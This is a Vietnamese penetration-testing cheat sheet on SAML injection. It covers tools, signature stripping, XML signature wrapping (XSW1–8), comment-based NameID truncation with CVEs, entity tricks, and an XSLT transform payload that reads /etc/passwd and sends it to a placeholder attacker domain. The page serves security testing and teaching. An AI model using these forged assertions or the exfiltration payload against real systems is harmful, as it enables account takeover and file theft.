# SAML Injection

> SAML (Security Assertion Markup Language) là một tiêu chuẩn mở được sử dụng để trao đổi dữ liệu xác thực và phân quyền giữa các bên, đặc biệt là giữa Identity Provider và Service Provider. Mặc dù SAML được sử dụng rộng rãi để hỗ trợ Single Sign-On (SSO) và các kịch bản xác thực liên kết khác, việc triển khai không đúng hoặc cấu hình sai có thể khiến hệ thống gặp nhiều loại lỗ hổng khác nhau.

## Tóm tắt

* [Công cụ](#tools)
* [Phương pháp](#methodology)

  * [Invalid Signature](#invalid-signature)
  * [Signature Stripping](#signature-stripping)
  * [XML Signature Wrapping Attacks](#xml-signature-wrapping-attacks)
  * [XML Comment Handling](#xml-comment-handling)
  * [XML External Entity](#xml-external-entity)
  * [Extensible Stylesheet Language Transformation](#extensible-stylesheet-language-transformation)
* [Tài liệu tham khảo](#references)

## Công cụ

* [CompassSecurity/SAMLRaider](https://github.com/SAMLRaider/SAMLRaider) - Extension SAML2 cho Burp.
* https://github.com/d0ge/XSW - Extension XML Signature Wrapping cho Burp Suite.
* [ZAP Addon/SAML Support](https://www.zaproxy.org/docs/desktop/addons/saml-support/) - Cho phép phát hiện, hiển thị, chỉnh sửa và fuzz SAML request.

## Phương pháp

Một SAML Response phải chứa `<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"`.

### Invalid Signature

Các signature không được ký bởi một CA hợp lệ có nguy cơ bị clone. Hãy đảm bảo signature được ký bởi một CA hợp lệ. Nếu certificate là self-signed, bạn có thể clone certificate hoặc tạo certificate self-signed của riêng mình để thay thế nó.

### Signature Stripping

> [...]chấp nhận các SAML assertion không có signature cũng giống như chấp nhận username mà không kiểm tra password - @ilektrojohn

Mục tiêu là tạo một SAML Assertion hợp lệ về mặt cấu trúc nhưng không ký nó. Với một số cấu hình mặc định, nếu phần signature bị loại bỏ khỏi SAML response thì quá trình xác minh signature sẽ không được thực hiện.

Ví dụ về SAML assertion trong đó `NameID=admin` nhưng không có signature.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol" Destination="http://localhost:7001/saml2/sp/acs/post" ID="id39453084082248801717742013" IssueInstant="2018-04-22T10:28:53.593Z" Version="2.0">
    <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" Format="urn:oasis:names:tc:SAML:2.0:nameidformat:entity">REDACTED</saml2:Issuer>
    <saml2p:Status xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol">
        <saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success" />
    </saml2p:Status>
    <saml2:Assertion xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" ID="id3945308408248426654986295" IssueInstant="2018-04-22T10:28:53.593Z" Version="2.0">
        <saml2:Issuer Format="urn:oasis:names:tc:SAML:2.0:nameid-format:entity" xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">REDACTED</saml2:Issuer>
        <saml2:Subject xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">
            <saml2:NameID Format="urn:oasis:names:tc:SAML:1.1:nameidformat:unspecified">admin</saml2:NameID>
            <saml2:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
                <saml2:SubjectConfirmationData NotOnOrAfter="2018-04-22T10:33:53.593Z" Recipient="http://localhost:7001/saml2/sp/acs/post" />
            </saml2:SubjectConfirmation>
        </saml2:Subject>
        <saml2:Conditions NotBefore="2018-04-22T10:23:53.593Z" NotOnOrAfter="2018-0422T10:33:53.593Z" xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">
            <saml2:AudienceRestriction>
                <saml2:Audience>WLS_SP</saml2:Audience>
            </saml2:AudienceRestriction>
        </saml2:Conditions>
        <saml2:AuthnStatement AuthnInstant="2018-04-22T10:28:49.876Z" SessionIndex="id1524392933593.694282512" xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">
            <saml2:AuthnContext>
                <saml2:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml2:AuthnContextClassRef>
            </saml2:AuthnContext>
        </saml2:AuthnStatement>
    </saml2:Assertion>
</saml2p:Response>
```

### XML Signature Wrapping Attacks

Tấn công XML Signature Wrapping (XSW) xảy ra khi một số implementation kiểm tra signature hợp lệ và liên kết nó với một assertion hợp lệ, nhưng không kiểm tra sự tồn tại của nhiều assertion, nhiều signature hoặc xử lý khác nhau tùy thuộc vào thứ tự của các assertion.

* **XSW1**: Áp dụng cho SAML Response message. Thêm một bản sao của Response không có signature sau signature hiện tại.
* **XSW2**: Áp dụng cho SAML Response message. Thêm một bản sao của Response không có signature trước signature hiện tại.
* **XSW3**: Áp dụng cho SAML Assertion message. Thêm một bản sao của Assertion không có signature trước Assertion hiện tại.
* **XSW4**: Áp dụng cho SAML Assertion message. Thêm một bản sao của Assertion không có signature bên trong Assertion hiện tại.
* **XSW5**: Áp dụng cho SAML Assertion message. Thay đổi một giá trị trong bản sao Assertion đã được ký và thêm một bản sao của Assertion gốc đã loại bỏ signature ở cuối SAML message.
* **XSW6**: Áp dụng cho SAML Assertion message. Thay đổi một giá trị trong bản sao Assertion đã được ký và thêm một bản sao của Assertion gốc đã loại bỏ signature sau signature gốc.
* **XSW7**: Áp dụng cho SAML Assertion message. Thêm một block “Extensions” chứa một assertion không có signature được clone.
* **XSW8**: Áp dụng cho SAML Assertion message. Thêm một block “Object” chứa bản sao của assertion gốc đã loại bỏ signature.

Trong ví dụ dưới đây, các thuật ngữ này được sử dụng.

* **FA**: Forged Assertion
* **LA**: Legitimate Assertion
* **LAS**: Signature của Legitimate Assertion

```xml
<SAMLResponse>
  <FA ID="evil">
      <Subject>Attacker</Subject>
  </FA>
  <LA ID="legitimate">
      <Subject>Legitimate User</Subject>
      <LAS>
         <Reference Reference URI="legitimate">
         </Reference>
      </LAS>
  </LA>
</SAMLResponse>
```

Trong lỗ hổng của Github Enterprise, request này sẽ được xác minh và tạo session cho `Attacker` thay vì `Legitimate User`, ngay cả khi `FA` không được ký.

### XML Comment Handling

Một threat actor đã có quyền authenticated access vào một hệ thống SSO có thể xác thực với tư cách một user khác mà không cần password SSO của user đó. [Lỗ hổng](https://www.bleepstatic.com/images/news/u/986406/attacks/Vulnerabilities/SAML-flaw.png) này xuất hiện với nhiều CVE trong các library và product sau.

* OneLogin - python-saml - CVE-2017-11427
* OneLogin - ruby-saml - CVE-2017-11428
* Clever - saml2-js - CVE-2017-11429
* OmniAuth-SAML - CVE-2017-11430
* Shibboleth - CVE-2018-0489
* Duo Network Gateway - CVE-2018-7340

Các nhà nghiên cứu nhận thấy rằng nếu attacker chèn một comment vào bên trong trường username theo cách làm phá vỡ username, attacker có thể giành quyền truy cập vào tài khoản của một user hợp lệ.

```xml
<SAMLResponse>
    <Issuer>https://idp.com/</Issuer>
    <Assertion ID="_id1234">
        <Subject>
            <NameID>user@user.com<!--XMLCOMMENT-->.evil.com</NameID>
```

Trong đó `user@user.com` là phần đầu tiên của username và `.evil.com` là phần thứ hai.

### XML External Entity

Một phương pháp khai thác khác là sử dụng `XML entities` để bypass quá trình xác minh signature, vì nội dung sẽ không thay đổi, ngoại trừ trong quá trình XML parsing.

Trong ví dụ dưới đây:

* `&s;` sẽ được resolve thành chuỗi `"s"`
* `&f1;` sẽ được resolve thành chuỗi `"f1"`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE Response [
  <!ENTITY s "s">
  <!ENTITY f1 "f1">
]>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
  Destination="https://idptestbed/Shibboleth.sso/SAML2/POST"
  ID="_04cfe67e596b7449d05755049ba9ec28"
  InResponseTo="_dbbb85ce7ff81905a3a7b4484afb3a4b"
  IssueInstant="2017-12-08T15:15:56.062Z" Version="2.0">
[...]
  <saml2:Attribute FriendlyName="uid"
    Name="urn:oid:0.9.2342.19200300.100.1.1"
    NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
    <saml2:AttributeValue>
      &s;taf&f1;
    </saml2:AttributeValue>
  </saml2:Attribute>
[...]
</saml2p:Response>
```

SAML response được Service Provider chấp nhận. Do lỗ hổng, ứng dụng Service Provider báo cáo `"taf"` là giá trị của thuộc tính `"uid"`.

### Extensible Stylesheet Language Transformation

Một XSLT có thể được thực hiện bằng cách sử dụng phần tử `transform`.

![http://sso-attacks.org/images/4/49/XSLT1.jpg](http://sso-attacks.org/images/4/49/XSLT1.jpg)
Hình ảnh từ http://sso-attacks.org/XSLT_Attack

```xml
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
  ...
    <ds:Transforms>
      <ds:Transform>
        <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
          <xsl:template match="doc">
            <xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
            <xsl:variable name="escaped" select="encode-for-uri($file)"/>
            <xsl:variable name="attackerUrl" select="'http://[ATTACKER.DOMAIN.TLD]/'"/>
            <xsl:variable name="exploitUrl"select="concat($attackerUrl,$escaped)"/>
            <xsl:value-of select="unparsed-text($exploitUrl)"/>
          </xsl:template>
        </xsl:stylesheet>
      </ds:Transform>
    </ds:Transforms>
  ...
</ds:Signature>
```

## Tài liệu tham khảo

* [Attacking SSO: Common SAML Vulnerabilities and Ways to Find Them - Jem Jensen - March 7, 2017](https://web.archive.org/web/20171113204302/https://blog.netspi.com/attacking-sso-common-saml-vulnerabilities-ways-find/)
* [How to Hunt Bugs in SAML; a Methodology - Part I - Ben Risher (@epi052) - March 7, 2019](https://web.archive.org/web/20260119151024/https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/)
* [How to Hunt Bugs in SAML; a Methodology - Part II - Ben Risher (@epi052) - March 13, 2019](https://web.archive.org/web/20190511102027/https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)
* [How to Hunt Bugs in SAML; a Methodology - Part III - Ben Risher (@epi052) - March 16, 2019](https://web.archive.org/web/20250619124546/https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)
* [On Breaking SAML: Be Whoever You Want to Be - Juraj Somorovsky, Andreas Mayer, Jorg Schwenk, Marco Kampmann, and Meiko Jensen - August 23, 2012](https://web.archive.org/web/20130520064525/https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91-8-23-12.pdf)
* [Oracle Weblogic - Multiple SAML Vulnerabilities (CVE-2018-2998/CVE-2018-2933) - Denis Andzakovic - July 18, 2018](https://web.archive.org/web/20181221074856/https://pulsesecurity.co.nz/advisories/WebLogic-SAML-Vulnerabilities)
* [SAML Burp Extension - Roland Bischofberger - July 24, 2015](https://web.archive.org/web/20260213191343/https://blog.compass-security.com/2015/07/saml-burp-extension/)
* [SAML Security Cheat Sheet - OWASP - February 2, 2019](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/SAML_Security_Cheat_Sheet.md)
* [The road to your codebase is paved with forged assertions - Ioannis Kakavas (@ilektrojohn) - March 13, 2017](https://web.archive.org/web/20170314055835/http://www.economyofmechanism.com/github-saml)
* [Truncation of SAML Attributes in Shibboleth 2 - redteam-pentesting.de - January 15, 2018](https://web.archive.org/web/20190607070528/https://www.redteam-pentesting.de/de/advisories/rt-sa-2017-013/-truncation-of-saml-attributes-in-shibboleth-2)
* [Vulnerability Note VU#475445 - Garret Wassermann - February 27, 2018](https://web.archive.org/web/20180227170113/http://kb.cert.org/vuls/id/475445)
